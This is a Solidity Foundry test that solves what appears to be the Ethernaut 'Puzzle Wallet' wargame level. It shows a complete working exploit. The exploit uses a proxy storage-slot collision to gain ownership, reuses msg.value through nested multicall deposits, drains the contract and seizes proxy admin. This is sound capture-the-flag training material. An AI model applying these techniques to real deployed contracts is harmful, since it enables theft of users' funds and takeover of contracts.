// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/24_PuzzleWallet.sol";

contract TestPuzzleWallet is Test {
    address public player = address(0xbad);
    address public bob = address(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38);
    PuzzleWallet public instance;
    PuzzleProxy public proxy;

    function setUp() public {
        vm.deal(bob, 0.001 ether);
        vm.deal(player, 0.001 ether);

        vm.startPrank(bob);
        PuzzleWallet implementation = new PuzzleWallet();
        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);
        proxy = new PuzzleProxy(bob, address(implementation), data);
        instance = PuzzleWallet(address(proxy));
        instance.addToWhitelist(bob);
        instance.deposit{value: 0.001 ether}();
        vm.stopPrank();
    }

    function testSolution() public {
        console.log(instance.maxBalance());

        vm.startPrank(player);

        proxy.proposeNewAdmin(player);
        instance.addToWhitelist(player);

        bytes[] memory multicalldata = new bytes[](1);
        multicalldata[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, multicalldata);

        instance.multicall{value: 0.001 ether}(data);
        instance.execute(player, 0.002 ether, "");
        instance.setMaxBalance(uint256(uint160(player)));

        vm.stopPrank();
        assertEq(proxy.admin(), player);
    }
}
